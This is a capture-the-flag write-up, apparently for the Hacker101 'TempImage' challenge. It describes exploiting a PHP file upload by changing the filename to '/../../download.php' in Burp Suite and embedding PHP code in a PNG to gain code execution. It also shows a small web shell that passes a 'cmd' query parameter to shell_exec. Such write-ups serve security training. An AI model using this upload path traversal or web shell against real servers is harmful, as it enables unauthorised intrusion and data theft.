# TempImage

## 1. Flag 2

Tried uploading files 

download.png -->> 820c946b78eb0d3b0dfe2067189de065_download.php.png

download2.png -->> 83ba84583557e3b03ad3bdc749370e73_download2.png

Files were renamed to <md5hash>_<realfilename>.<ext>

Tried to download 159df48875627e2f7f66dae584c5e3a5_flag.txt and some other didn't work

Watched a H101 file inclusion video, got info about file multipart/form-data esp boundary param.

Connected Burp Suite and tried changing the filename param to `/etc/passwd` got following error.

```php+HTML
Warning: move_uploaded_file(files/c5068b7c2b1707f8939b283a2758a691_/etc/passwd): failed to open stream: No such file or directory in /app/doUpload.php on line 7

Warning: move_uploaded_file(): Unable to move '/tmp/phpSayLpg' to 'files/c5068b7c2b1707f8939b283a2758a691_/etc/passwd' in /app/doUpload.php on line 7
ERROR: Upload failed
```

Got all the info required. The file content when uploaded is present at `/tmp/phpSayLpg`  and is being moved to files/<md5sum of filename>_file_name.<ext>

Great!

Modified  `download.png` (downloded from google) with embedded php code included just `<?php echo "hello world" ?> ` using exiftool to check (BTW using exiftool was causing problem 'unexpected end of file' error, attached payload manually at the end of file)

![Screen Shot 2020-05-17 at 12.55.13 AM](/Users/rajsharm/Desktop/Screen Shot 2020-05-17 at 12.55.13 AM.jpg)

Uploaded the png, intercepting in Burp and changing the file name to `/../../download.php` in the filename param as well as in each boundary.

This way file gets moved to the directory where index.php is present because the call to move_uploaded_file() will be called with `files/0742d73fcdc2f4f928d8995aaac3c024_/../../download.php`

Now we have RCE!

Embedded `<?php echo file_get_contents("index.php"); ?>` in png, server returned the contents of index.php, viewed the source code **got the FLAG**

## 2. Flag 1

Now that we have RCE, embedded below

```php
$output = shell_exec($_GET['cmd']);
echo "<pre>$output</pre>";
```

in the png and uploaded.

Now we have shell access.

Did cat on all the files present. Using `http://35.227.24.107/60923ee32a/download.php?cmd=cat doUpload.php`

**Found the Flag in doUpload.php**

